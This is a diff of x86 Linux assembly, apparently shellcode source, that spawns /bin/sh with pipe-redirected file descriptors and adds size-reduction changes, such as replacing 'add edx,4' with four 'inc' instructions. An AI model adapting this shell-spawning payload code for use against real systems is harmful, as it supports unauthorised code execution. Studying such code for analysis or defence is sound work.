@@ -118,7 +118,7 @@ child:
 
 	cmp	eax,ecx
 	jne	leave_sh_interleaved
-	
+%ifndef OPTIMIZE_FOR_SIZE_HARD
 	; dup2(sh2m[1], 2)   (dup to stderr)
 	xor	eax,eax
 	mov	al,63
@@ -128,6 +128,7 @@ child:
 
 	cmp	eax,ecx
 	jne	leave_sh_interleaved
+%endif
 
 	; execve("/bin/sh", ["/bin/sh",NULL], [NULL])
 	xor	eax,eax
@@ -142,7 +143,10 @@ child:
 	mov	[ecx],ebx			; foo := @'/bin/sh',0
 	mov	[ecx+4],edx			; bar := NULL
 	mov	edx,ecx
-	add	edx,4				; edx -> bar
+	inc	edx
+	inc	edx
+	inc	edx
+	inc	edx				; edx -> bar
 	int	0x80
 
 	; fail if execve did not work.
@@ -153,6 +157,7 @@ parent:
 	; remember child's PID
 	mov	[ebp+child_pid],eax
 
+%ifndef OPTIMIZE_FOR_SIZE_HARD
 	; close(m2sh[0])
 	xor	eax,eax
 	mov	al,6
@@ -164,6 +169,7 @@ parent:
 	mov	al,6
 	mov	ebx,[ebp+sh2m_1]
 	int	0x80
+%endif
 
 	; clone:
 	; one thread for reader, one thread for writer
